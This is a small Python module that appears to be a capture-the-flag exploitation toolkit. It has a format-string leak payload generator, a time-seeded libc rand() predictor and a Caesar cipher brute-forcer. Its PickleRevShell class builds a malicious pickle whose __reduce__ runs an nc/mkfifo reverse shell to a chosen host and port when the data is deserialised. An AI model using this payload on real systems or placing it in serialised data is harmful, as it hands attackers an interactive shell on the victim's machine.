#!/usr/bin/env python3
import pickle
import os
from ctypes import CDLL

def format_str_bruteforce(n=100):
	for i in range(n):
		yield f"%{i}$s\n"

def libc_rand():
	libc = CDLL("libc.so.6")
	libc.srand(libc.time(None))
	while True:
		yield libc.rand()

def caesar(s, alphabet_only=True):
	if alphabet_only:
		for i in range(26):
			yield "".join(
				chr((ord(c) + i - 65) % 26 + 65) if c.isupper() else chr((ord(c) + i - 97) % 26 + 97) if c.islower() else c
				for c in s
			)
	else:  #full ascii
		for i in range(128):
			yield "".join(chr((ord(c) + i) % 128) for c in s if (ord(c) + i) % 128 > 31)

class PickleRevShell:
	def __init__(self, host, port):
		self.host = host
		self.port = port
	
	def __reduce__(self):
		cmd = f"rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {self.host} {self.port} > /tmp/f"
		return os.system, (cmd, )

def pickle_rev_shell(host, port):
	return pickle.dumps(PickleRevShell(host, port))
